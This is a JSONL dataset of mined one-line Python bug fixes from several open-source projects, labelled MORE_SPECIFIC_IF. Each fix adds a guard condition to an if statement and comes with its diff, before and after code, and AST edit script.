{"project": "radical.saga", "commit_sha": "16672c7007d336b6f29cec5e087a774e6c4a5439", "parent_sha": "c91c193a9bddd139303392b984a72a8d1727ffc6", "file_path": "saga/adaptors/shell/shell_job.py", "project_url": "https://github.com/radical-cybertools/radical.saga", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -331,7 +331,7 @@ class ShellJobService (saga.adaptors.cpi.job.Service) :\n         self.session = session\n         self.njobs   = 0\n \n-        if  self.rm.path and self.rm.path != '/' :\n+        if  self.rm.path and self.rm.path != '/' and self.rm.path != '.' :\n             self.opts['shell'] = self.rm.path\n \n         self.shell = saga.utils.pty_shell.PTYShell (self.rm, self.session, \n", "before": "if self . rm . path and self . rm . path != '/' : self . opts [ 'shell' ] = self . rm . path", "after": "if self . rm . path and self . rm . path != '/' and self . rm . path != '.' : self . opts [ 'shell' ] = self . rm . path", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Move\", [\"boolean_operator\", 3, 13, 3, 49], [\"boolean_operator\", 3, 13, 3, 49], 0], [\"Insert\", [\"boolean_operator\", 3, 13, 3, 49], [\"and:and\", \"T\"], 1], [\"Insert\", [\"boolean_operator\", 3, 13, 3, 49], [\"comparison_operator\", \"N0\"], 2], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"!=:!=\", \"T\"], 1], [\"Insert\", \"N0\", [\"string:'.'\", \"T\"], 2], [\"Insert\", \"N1\", [\"attribute\", \"N2\"], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:path\", \"T\"], 2], [\"Insert\", \"N2\", [\"identifier:self\", \"T\"], 0], [\"Insert\", \"N2\", [\".:.\", \"T\"], 1], [\"Insert\", \"N2\", [\"identifier:rm\", \"T\"], 2]]"}
{"project": "radical.saga", "commit_sha": "d8d2091a5cce7d5cc7d90423088d0a68ffa139a3", "parent_sha": "68174367ccf22accfa83bab2a0207fe277dac26e", "file_path": "saga/adaptors/shell/shell_job.py", "project_url": "https://github.com/radical-cybertools/radical.saga", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -331,7 +331,7 @@ class ShellJobService (saga.adaptors.cpi.job.Service) :\n         self.session = session\n         self.njobs   = 0\n \n-        if  self.rm.path and self.rm.path != '/' :\n+        if  self.rm.path and self.rm.path != '/' and self.rm.path != '.' :\n             self.opts['shell'] = self.rm.path\n \n         self.shell = saga.utils.pty_shell.PTYShell (self.rm, self.session, \n", "before": "if self . rm . path and self . rm . path != '/' : self . opts [ 'shell' ] = self . rm . path", "after": "if self . rm . path and self . rm . path != '/' and self . rm . path != '.' : self . opts [ 'shell' ] = self . rm . path", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Move\", [\"boolean_operator\", 3, 13, 3, 49], [\"boolean_operator\", 3, 13, 3, 49], 0], [\"Insert\", [\"boolean_operator\", 3, 13, 3, 49], [\"and:and\", \"T\"], 1], [\"Insert\", [\"boolean_operator\", 3, 13, 3, 49], [\"comparison_operator\", \"N0\"], 2], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"!=:!=\", \"T\"], 1], [\"Insert\", \"N0\", [\"string:'.'\", \"T\"], 2], [\"Insert\", \"N1\", [\"attribute\", \"N2\"], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:path\", \"T\"], 2], [\"Insert\", \"N2\", [\"identifier:self\", \"T\"], 0], [\"Insert\", \"N2\", [\".:.\", \"T\"], 1], [\"Insert\", \"N2\", [\"identifier:rm\", \"T\"], 2]]"}
{"project": "scout", "commit_sha": "81bc474feabc670f41dba44ee4803e446b28b998", "parent_sha": "9574a629aaff74a0671dd60eadb8eb08a79f0e60", "file_path": "scout/server/blueprints/variants/controllers.py", "project_url": "https://github.com/Clinical-Genomics/scout", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -371,7 +371,7 @@ def sanger(store, mail, institute_obj, case_obj, user_obj, variant_obj, sender):\n     variant_link = url_for('variants.variant', institute_id=institute_obj['_id'],\n                            case_name=case_obj['display_name'],\n                            variant_id=variant_obj['_id'])\n-    if variant_obj['_id'] not in case_obj['suspects']:\n+    if 'suspects' in case_obj and variant_obj['_id'] not in case_obj['suspects']:\n         store.pin_variant(institute_obj, case_obj, user_obj, variant_link, variant_obj)\n \n     recipients = institute_obj['sanger_recipients']\n", "before": "if variant_obj [ '_id' ] not in case_obj [ 'suspects' ] : store . pin_variant ( institute_obj , case_obj , user_obj , variant_link , variant_obj )", "after": "if 'suspects' in case_obj and variant_obj [ '_id' ] not in case_obj [ 'suspects' ] : store . pin_variant ( institute_obj , case_obj , user_obj , variant_link , variant_obj )", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 5, 4, 88], [\"boolean_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 8, 3, 54], 2], [\"Insert\", \"N1\", [\"string:'suspects'\", \"T\"], 0], [\"Insert\", \"N1\", [\"in:in\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:case_obj\", \"T\"], 2]]"}
{"project": "scout", "commit_sha": "f077b587d4a0a64d48ea7649bd96dd18d9e6e26e", "parent_sha": "10dfcf8b4e783f347727744a4fb5121f0a326c2e", "file_path": "scout/server/blueprints/cases/controllers.py", "project_url": "https://github.com/Clinical-Genomics/scout", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -252,7 +252,7 @@ def get_sanger_unevaluated(store, institute_id):\n             variant_obj = store.variant(document_id=var_id, case_id=case)\n \n             # Double check that Sanger was ordered (and not canceled) for the variant\n-            if variant_obj.get('sanger_ordered') and variant_obj.get('sanger_ordered') is True:\n+            if variant_obj and (variant_obj.get('sanger_ordered') and variant_obj.get('sanger_ordered') is True):\n \n                 # Collect variant ID only if variant is not yet evaluated\n                 if 'validation' not in variant_obj or not variant_obj.get('validation') in ['True positive', 'False positive']:\n", "before": "if variant_obj . get ( 'sanger_ordered' ) and variant_obj . get ( 'sanger_ordered' ) is True : if 'validation' not in variant_obj or not variant_obj . get ( 'validation' ) in [ 'True positive' , 'False positive' ] : ", "after": "if variant_obj and ( variant_obj . get ( 'sanger_ordered' ) and variant_obj . get ( 'sanger_ordered' ) is True ) : if 'validation' not in variant_obj or not variant_obj . get ( 'validation' ) in [ 'True positive' , 'False positive' ] : ", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"boolean_operator\", 3, 16, 3, 95], [\"identifier:variant_obj\", \"T\"], 0], [\"Insert\", [\"boolean_operator\", 3, 16, 3, 95], [\"and:and\", \"T\"], 1], [\"Insert\", [\"boolean_operator\", 3, 16, 3, 95], [\"parenthesized_expression\", \"N0\"], 2], [\"Insert\", \"N0\", [\"(:(\", \"T\"], 0], [\"Move\", \"N0\", [\"boolean_operator\", 3, 16, 3, 95], 1], [\"Insert\", \"N0\", [\"):)\", \"T\"], 2]]"}
{"project": "spaCy", "commit_sha": "924c58bde38c0b97f35e746b3d1367aa7f6c907b", "parent_sha": "f74a45c1fe54b4a63c17626baf5572377d179410", "file_path": "spacy/util.py", "project_url": "https://github.com/connorbrinton/spaCy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -429,7 +429,7 @@ def to_bytes(getters, exclude):\n def from_bytes(bytes_data, setters, exclude):\n     msg = msgpack.loads(bytes_data, encoding='utf8')\n     for key, setter in setters.items():\n-        if key not in exclude:\n+        if key not in exclude and key in msg:\n             setter(msg[key])\n     return msg\n \n", "before": "if key not in exclude : setter ( msg [ key ] )", "after": "if key not in exclude and key in msg : setter ( msg [ key ] )", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 9, 4, 29], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 12, 3, 30], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"identifier:key\", \"T\"], 0], [\"Insert\", \"N1\", [\"in:in\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:msg\", \"T\"], 2]]"}
{"project": "spaCy", "commit_sha": "cef97e4b6352be205e68a9c7f0d10b4c44151b88", "parent_sha": "db2dbc8e59d1a61a0d16fea371925e4667c8dec9", "file_path": "spacy/gold/corpus.py", "project_url": "https://github.com/connorbrinton/spaCy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -62,7 +62,7 @@ class Corpus:\n             if str(path) in seen:\n                 continue\n             seen.add(str(path))\n-            if path.parts[-1].startswith(\".\"):\n+            if path.parts and path.parts[-1].startswith(\".\"):\n                 continue\n             elif path.is_dir():\n                 paths.extend(path.iterdir())\n", "before": "if path . parts [ - 1 ] . startswith ( \".\" ) : continue elif path . is_dir ( ) : paths . extend ( path . iterdir ( ) )", "after": "if path . parts and path . parts [ - 1 ] . startswith ( \".\" ) : continue elif path . is_dir ( ) : paths . extend ( path . iterdir ( ) )", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 13, 6, 45], [\"boolean_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Move\", \"N0\", [\"call\", 3, 16, 3, 46], 2], [\"Insert\", \"N1\", [\"identifier:path\", \"T\"], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:parts\", \"T\"], 2]]"}
{"project": "spaCy", "commit_sha": "99d2a25687c7a788a20dfc6210c48045c95e4b6d", "parent_sha": "071c09ff35dec169e801fe3c7cabc18a07975f74", "file_path": "setup.py", "project_url": "https://github.com/connorbrinton/spaCy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -193,7 +193,7 @@ def setup_package():\n \n     root = os.path.abspath(os.path.dirname(__file__))\n \n-    if len(sys.argv) > 1 and sys.argv[1] == \"clean\":\n+    if hasattr(sys, \"argv\") and len(sys.argv) > 1 and sys.argv[1] == \"clean\":\n         return clean(root)\n \n     with chdir(root):\n", "before": "if len ( sys . argv ) > 1 and sys . argv [ 1 ] == \"clean\" : return clean ( root )", "after": "if hasattr ( sys , \"argv\" ) and len ( sys . argv ) > 1 and sys . argv [ 1 ] == \"clean\" : return clean ( root )", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"boolean_operator\", 3, 8, 3, 52], [\"boolean_operator\", \"N0\"], 0], [\"Insert\", \"N0\", [\"call\", \"N1\"], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 8, 3, 25], 2], [\"Insert\", \"N1\", [\"identifier:hasattr\", \"T\"], 0], [\"Insert\", \"N1\", [\"argument_list\", \"N2\"], 1], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"identifier:sys\", \"T\"], 1], [\"Insert\", \"N2\", [\",:,\", \"T\"], 2], [\"Insert\", \"N2\", [\"string:\\\"argv\\\"\", \"T\"], 3], [\"Insert\", \"N2\", [\"):)\", \"T\"], 4]]"}
{"project": "blaze", "commit_sha": "e8eadf8996b5a0ba112efb7ad75e6d7e79ba398a", "parent_sha": "43c59dae47c36e2d4a809b24ee95f7800773f432", "file_path": "blaze/io/server/tests/test_server.py", "project_url": "https://github.com/TomAugspurger/blaze", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -22,7 +22,7 @@ class TestServer(unittest.TestCase):\n         for attempt in range(5):\n             self.port = 10000 + random.randrange(30000)\n             cflags = 0\n-            if sys.platform == 'win32':\n+            if sys.platform == 'win32' and sys.version_info[:2] > (2, 6):\n                 cflags |= subprocess.CREATE_NEW_PROCESS_GROUP\n \n             self.proc = subprocess.Popen([sys.executable,\n", "before": "if sys . platform == 'win32' : cflags |= subprocess . CREATE_NEW_PROCESS_GROUP", "after": "if sys . platform == 'win32' and sys . version_info [ : 2 ] > ( 2 , 6 ) : cflags |= subprocess . CREATE_NEW_PROCESS_GROUP", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 13, 4, 62], [\"boolean_operator\", \"N0\"], 1], [\"Insert\", [\"if_statement\", 3, 13, 4, 62], [\":::\", \"T\"], 2], [\"Move\", \"N0\", [\"comparison_operator\", 3, 16, 3, 39], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"subscript\", \"N2\"], 0], [\"Insert\", \"N1\", [\">:>\", \"T\"], 1], [\"Insert\", \"N1\", [\"tuple\", \"N3\"], 2], [\"Insert\", \"N2\", [\"attribute\", \"N4\"], 0], [\"Insert\", \"N2\", [\"[:[\", \"T\"], 1], [\"Insert\", \"N2\", [\"slice\", \"N5\"], 2], [\"Insert\", \"N2\", [\"]:]\", \"T\"], 3], [\"Insert\", \"N3\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N3\", [\"integer:2\", \"T\"], 1], [\"Insert\", \"N3\", [\",:,\", \"T\"], 2], [\"Insert\", \"N3\", [\"integer:6\", \"T\"], 3], [\"Insert\", \"N3\", [\"):)\", \"T\"], 4], [\"Insert\", \"N4\", [\"identifier:sys\", \"T\"], 0], [\"Insert\", \"N4\", [\".:.\", \"T\"], 1], [\"Insert\", \"N4\", [\"identifier:version_info\", \"T\"], 2], [\"Move\", \"N5\", [\":::\", 3, 39, 3, 40], 0], [\"Insert\", \"N5\", [\"integer:2\", \"T\"], 1]]"}
{"project": "bokeh", "commit_sha": "e955e16fe9bf253b7a8acd1d82cd74d72a2daf87", "parent_sha": "eaab778dae4dd773495b5556262cdc9cd07084a2", "file_path": "bokeh/charts/builder/boxplot_builder.py", "project_url": "https://github.com/TomAugspurger/bokeh", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -220,7 +220,7 @@ class BoxPlotBuilder(Builder):\n         end_y = max(self._data_segment[self._attr_segment[3]])\n \n         ## Expand min/max to encompass outliers\n-        if self.outliers:\n+        if self.outliers and self._data_scatter[self._attr_scatter[1]]:\n             start_out_y = min(self._data_scatter[self._attr_scatter[1]])\n             end_out_y = max(self._data_scatter[self._attr_scatter[1]])\n             # it could be no outliers in some sides...\n", "before": "if self . outliers : start_out_y = min ( self . _data_scatter [ self . _attr_scatter [ 1 ] ] ) end_out_y = max ( self . _data_scatter [ self . _attr_scatter [ 1 ] ] )", "after": "if self . outliers and self . _data_scatter [ self . _attr_scatter [ 1 ] ] : start_out_y = min ( self . _data_scatter [ self . _attr_scatter [ 1 ] ] ) end_out_y = max ( self . _data_scatter [ self . _attr_scatter [ 1 ] ] )", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 9, 6, 55], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"attribute\", 3, 12, 3, 25], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Insert\", \"N0\", [\"subscript\", \"N1\"], 2], [\"Insert\", \"N1\", [\"attribute\", \"N2\"], 0], [\"Insert\", \"N1\", [\"[:[\", \"T\"], 1], [\"Insert\", \"N1\", [\"subscript\", \"N3\"], 2], [\"Insert\", \"N1\", [\"]:]\", \"T\"], 3], [\"Insert\", \"N2\", [\"identifier:self\", \"T\"], 0], [\"Insert\", \"N2\", [\".:.\", \"T\"], 1], [\"Insert\", \"N2\", [\"identifier:_data_scatter\", \"T\"], 2], [\"Insert\", \"N3\", [\"attribute\", \"N4\"], 0], [\"Insert\", \"N3\", [\"[:[\", \"T\"], 1], [\"Insert\", \"N3\", [\"integer:1\", \"T\"], 2], [\"Insert\", \"N3\", [\"]:]\", \"T\"], 3], [\"Insert\", \"N4\", [\"identifier:self\", \"T\"], 0], [\"Insert\", \"N4\", [\".:.\", \"T\"], 1], [\"Insert\", \"N4\", [\"identifier:_attr_scatter\", \"T\"], 2]]"}
{"project": "bokeh", "commit_sha": "6d95eb595f69a101c71f5a3c7d274df2902469f9", "parent_sha": "60c753e5ede8a0edfbc8cdfed45879572f901dac", "file_path": "bokeh/charts/glyphs.py", "project_url": "https://github.com/TomAugspurger/bokeh", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -597,7 +597,7 @@ class Interval(AggregateGlyph):\n \n     def get_end(self):\n         \"\"\"Get the value for the end of the glyph.\"\"\"\n-        if len(self.values.index) == 1:\n+        if len(self.values.index) == 1 and not self.values.dtype.name == 'object':\n             self.end_agg = None\n             return self.values[0]\n         elif isinstance(self.end_agg, str):\n", "before": "if len ( self . values . index ) == 1 : self . end_agg = None return self . values [ 0 ] elif isinstance ( self . end_agg , str ) : ", "after": "if len ( self . values . index ) == 1 and not self . values . dtype . name == 'object' : self . end_agg = None return self . values [ 0 ] elif isinstance ( self . end_agg , str ) : ", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 9, 6, 44], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 12, 3, 39], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Insert\", \"N0\", [\"not_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"not:not\", \"T\"], 0], [\"Insert\", \"N1\", [\"comparison_operator\", \"N2\"], 1], [\"Insert\", \"N2\", [\"attribute\", \"N3\"], 0], [\"Insert\", \"N2\", [\"==:==\", \"T\"], 1], [\"Insert\", \"N2\", [\"string:'object'\", \"T\"], 2], [\"Insert\", \"N3\", [\"attribute\", \"N4\"], 0], [\"Insert\", \"N3\", [\".:.\", \"T\"], 1], [\"Insert\", \"N3\", [\"identifier:name\", \"T\"], 2], [\"Insert\", \"N4\", [\"attribute\", \"N5\"], 0], [\"Insert\", \"N4\", [\".:.\", \"T\"], 1], [\"Insert\", \"N4\", [\"identifier:dtype\", \"T\"], 2], [\"Insert\", \"N5\", [\"identifier:self\", \"T\"], 0], [\"Insert\", \"N5\", [\".:.\", \"T\"], 1], [\"Insert\", \"N5\", [\"identifier:values\", \"T\"], 2]]"}
{"project": "bokeh", "commit_sha": "048e347249adee197d70a508fbb5cb0ef6adb501", "parent_sha": "e228869cb63785ceafe8182118ecd77e84851f83", "file_path": "bokeh/plotting.py", "project_url": "https://github.com/TomAugspurger/bokeh", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -368,7 +368,7 @@ def visual(func):\n                 (output_type == \"notebook\" and output_url is not None):\n             # push the plot data to a plot server\n             session.store_all()\n-            if output_type == \"notebook\":\n+            if output_type == \"notebook\" and not _config['hold']:\n                 session.show(plot, *session_objs)\n \n         else: # File output mode\n", "before": "if output_type == \"notebook\" : session . show ( plot , * session_objs ) else : ", "after": "if output_type == \"notebook\" and not _config [ 'hold' ] : session . show ( plot , * session_objs ) else : ", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 13, 6, 14], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 16, 3, 41], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Insert\", \"N0\", [\"not_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"not:not\", \"T\"], 0], [\"Insert\", \"N1\", [\"subscript\", \"N2\"], 1], [\"Insert\", \"N2\", [\"identifier:_config\", \"T\"], 0], [\"Insert\", \"N2\", [\"[:[\", \"T\"], 1], [\"Insert\", \"N2\", [\"string:'hold'\", \"T\"], 2], [\"Insert\", \"N2\", [\"]:]\", \"T\"], 3]]"}
{"project": "bokeh", "commit_sha": "52bdd9cbd05c81106903612bb1136c32d8825337", "parent_sha": "2092f63c80117422823b09b80ae433a1da67d268", "file_path": "bokeh/plotting.py", "project_url": "https://github.com/TomAugspurger/bokeh", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -368,7 +368,7 @@ def visual(func):\n                 (output_type == \"notebook\" and output_url is not None):\n             # push the plot data to a plot server\n             session.store_all()\n-            if output_type == \"notebook\":\n+            if output_type == \"notebook\" and not _config['hold']:\n                 session.show(plot, *session_objs)\n \n         else: # File output mode\n", "before": "if output_type == \"notebook\" : session . show ( plot , * session_objs ) else : ", "after": "if output_type == \"notebook\" and not _config [ 'hold' ] : session . show ( plot , * session_objs ) else : ", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 13, 6, 14], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 16, 3, 41], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Insert\", \"N0\", [\"not_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"not:not\", \"T\"], 0], [\"Insert\", \"N1\", [\"subscript\", \"N2\"], 1], [\"Insert\", \"N2\", [\"identifier:_config\", \"T\"], 0], [\"Insert\", \"N2\", [\"[:[\", \"T\"], 1], [\"Insert\", \"N2\", [\"string:'hold'\", \"T\"], 2], [\"Insert\", \"N2\", [\"]:]\", \"T\"], 3]]"}
{"project": "unknown-horizons", "commit_sha": "23228f01da762140b83183d6ae11152373060655", "parent_sha": "83ebba5dcbb5db0fcda1b6031d5a62b7bc72097f", "file_path": "horizons/ai/aiplayer/productionbuilder.py", "project_url": "https://github.com/schittom/unknown-horizons", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -321,7 +321,7 @@ class ProductionBuilder(AreaBuilder):\n \t\t\t\tarea_label[coords] = None\n \t\tareas = 0\n \t\tfor coords in collector_area:\n-\t\t\tif area_label[coords] is not None:\n+\t\t\tif coords in area_label and area_label[coords] is not None:\n \t\t\t\tcontinue\n \n \t\t\tqueue = deque([coords])\n", "before": "if area_label [ coords ] is not None : continue", "after": "if coords in area_label and area_label [ coords ] is not None : continue", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 4, 4, 13], [\"boolean_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 7, 3, 37], 2], [\"Insert\", \"N1\", [\"identifier:coords\", \"T\"], 0], [\"Insert\", \"N1\", [\"in:in\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:area_label\", \"T\"], 2]]"}
{"project": "unknown-horizons", "commit_sha": "ce30ca8899c39f394c839783626e37c1ef67cfd0", "parent_sha": "4508c781ada5e5e88cc0754b25413f032433f004", "file_path": "horizons/gui/widgets/logbook.py", "project_url": "https://github.com/schittom/unknown-horizons", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -176,7 +176,7 @@ class LogBook(PickBeltWidget):\n \t\t\tself._cur_entry = len(self._messages) - 1\n \t\telse:\n \t\t\tself._cur_entry = len(self._messages) - 2\n-\t\tif show_logbook:\n+\t\tif show_logbook and hasattr(self, \"_gui\"):\n \t\t\tself._redraw_captainslog()\n \n \tdef clear(self):\n", "before": "if show_logbook : self . _redraw_captainslog ( )", "after": "if show_logbook and hasattr ( self , \"_gui\" ) : self . _redraw_captainslog ( )", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 3, 4, 30], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"identifier:show_logbook\", 3, 6, 3, 18], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Insert\", \"N0\", [\"call\", \"N1\"], 2], [\"Insert\", \"N1\", [\"identifier:hasattr\", \"T\"], 0], [\"Insert\", \"N1\", [\"argument_list\", \"N2\"], 1], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"identifier:self\", \"T\"], 1], [\"Insert\", \"N2\", [\",:,\", \"T\"], 2], [\"Insert\", \"N2\", [\"string:\\\"_gui\\\"\", \"T\"], 3], [\"Insert\", \"N2\", [\"):)\", \"T\"], 4]]"}
{"project": "unknown-horizons", "commit_sha": "545817bf9abfe80ce8144c7526eb6980f7155db9", "parent_sha": "8cee05033de9296a148cdf4b66bf675811ada5e0", "file_path": "horizons/gui/widgets/logbook.py", "project_url": "https://github.com/schittom/unknown-horizons", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -176,7 +176,7 @@ class LogBook(PickBeltWidget):\n \t\t\tself._cur_entry = len(self._messages) - 1\n \t\telse:\n \t\t\tself._cur_entry = len(self._messages) - 2\n-\t\tif show_logbook:\n+\t\tif show_logbook and hasattr(self, \"_gui\"):\n \t\t\tself._redraw_captainslog()\n \n \tdef clear(self):\n", "before": "if show_logbook : self . _redraw_captainslog ( )", "after": "if show_logbook and hasattr ( self , \"_gui\" ) : self . _redraw_captainslog ( )", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 3, 4, 30], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"identifier:show_logbook\", 3, 6, 3, 18], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Insert\", \"N0\", [\"call\", \"N1\"], 2], [\"Insert\", \"N1\", [\"identifier:hasattr\", \"T\"], 0], [\"Insert\", \"N1\", [\"argument_list\", \"N2\"], 1], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"identifier:self\", \"T\"], 1], [\"Insert\", \"N2\", [\",:,\", \"T\"], 2], [\"Insert\", \"N2\", [\"string:\\\"_gui\\\"\", \"T\"], 3], [\"Insert\", \"N2\", [\"):)\", \"T\"], 4]]"}
{"project": "unknown-horizons", "commit_sha": "ac349fd996339cf99856099ef9224d4cf02856e0", "parent_sha": "dd2fbe6c8e1aca825217cdf1a8f80d9c1b3f7ed4", "file_path": "horizons/world/units/animal.py", "project_url": "https://github.com/schittom/unknown-horizons", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -190,7 +190,7 @@ class WildAnimal(CollectorAnimal, Collector):\n \t\t# try to get away with a random job\n \t\tfor i in xrange(5):\n \t\t\tprovider = self._building_index.get_random_building_in_range(self.position.to_tuple())\n-\t\t\tif self.check_possible_job_target(provider):\n+\t\t\tif provider is not None and self.check_possible_job_target(provider):\n \t\t\t\tjob = self.check_possible_job_target_for(provider, self._required_resource_id)\n \t\t\t\tif job is not None and self.check_move(job.object.loading_area):\n \t\t\t\t\treturn job\n", "before": "if self . check_possible_job_target ( provider ) : job = self . check_possible_job_target_for ( provider , self . _required_resource_id ) if job is not None and self . check_move ( job . object . loading_area ) : return job", "after": "if provider is not None and self . check_possible_job_target ( provider ) : job = self . check_possible_job_target_for ( provider , self . _required_resource_id ) if job is not None and self . check_move ( job . object . loading_area ) : return job", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 4, 6, 16], [\"boolean_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Move\", \"N0\", [\"call\", 3, 7, 3, 47], 2], [\"Insert\", \"N1\", [\"identifier:provider\", \"T\"], 0], [\"Insert\", \"N1\", [\"is:is\", \"T\"], 1], [\"Insert\", \"N1\", [\"not:not\", \"T\"], 2], [\"Insert\", \"N1\", [\"none:None\", \"T\"], 3]]"}
{"project": "django-datatable-view", "commit_sha": "4dfe1c35f5ff103443b94d5b255ecc0d861f1224", "parent_sha": "9ed1c436d9bbdb570f6f97f086dcff2dffffe1d4", "file_path": "datatableview/utils.py", "project_url": "https://github.com/utapyngo/django-datatable-view", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -196,7 +196,7 @@ class DatatableStructure(StrAndUnicode):\n             column = get_field_definition(column)\n             pretty_name = column.pretty_name\n             column_name = column.pretty_name\n-            if not pretty_name:\n+            if not pretty_name and column.fields[0] in model_fields:\n                 field = self.model._meta.get_field_by_name(column.fields[0])[0]\n                 column_name = field.name\n                 pretty_name = field.verbose_name\n", "before": "if not pretty_name : field = self . model . _meta . get_field_by_name ( column . fields [ 0 ] ) [ 0 ] column_name = field . name pretty_name = field . verbose_name", "after": "if not pretty_name and column . fields [ 0 ] in model_fields : field = self . model . _meta . get_field_by_name ( column . fields [ 0 ] ) [ 0 ] column_name = field . name pretty_name = field . verbose_name", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"not_operator\", 3, 16, 3, 31], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"identifier:pretty_name\", 3, 20, 3, 31], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"subscript\", \"N2\"], 0], [\"Insert\", \"N1\", [\"in:in\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:model_fields\", \"T\"], 2], [\"Insert\", \"N2\", [\"attribute\", \"N3\"], 0], [\"Insert\", \"N2\", [\"[:[\", \"T\"], 1], [\"Insert\", \"N2\", [\"integer:0\", \"T\"], 2], [\"Insert\", \"N2\", [\"]:]\", \"T\"], 3], [\"Insert\", \"N3\", [\"identifier:column\", \"T\"], 0], [\"Insert\", 